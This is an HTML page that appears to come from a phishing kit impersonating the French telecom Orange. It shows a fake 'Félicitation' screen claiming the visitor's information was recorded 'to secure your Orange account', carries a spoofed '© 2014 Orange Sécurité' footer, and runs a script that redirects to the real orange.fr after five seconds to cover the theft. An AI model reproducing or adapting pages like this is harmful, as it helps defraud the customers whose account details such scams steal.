<script>
function GoOut(){
top.location.href = "http://www.orange.fr/";
}
setTimeout("GoOut()",5000);
</script>
<div class="contenu">
			<div id="pavtitle" class="pave_gris_532">F&eacute;licitation</div>
  <div style="border:1px solid #DDD;width:570px;" align="center">
			<br>
			<div id="ansr" align="center"></div>
			<br>
			<b>F&eacute;licitation, vos information sont prises en compte &agrave; fin de s&eacute;curiser votre compte Orange.</b><br><br>
			<a style="font-size:12px;font-weight:none; ">Redirection vers le portail Orange ... (<a style="font-size:11px;color:#FF5500;" onclick="GoOut()" href="http://www.orange.fr/" target="_top">cliquez ici</a>)</a><br><br>
			<img src="loading.gif"><br>
			&copy; 2014 Orange S&eacute;curit&eacute;	<br>
			<br>
			<br>
			
			</div>
		    <div class="pave_gris_bas" align="right"></div>
        </form>
</div>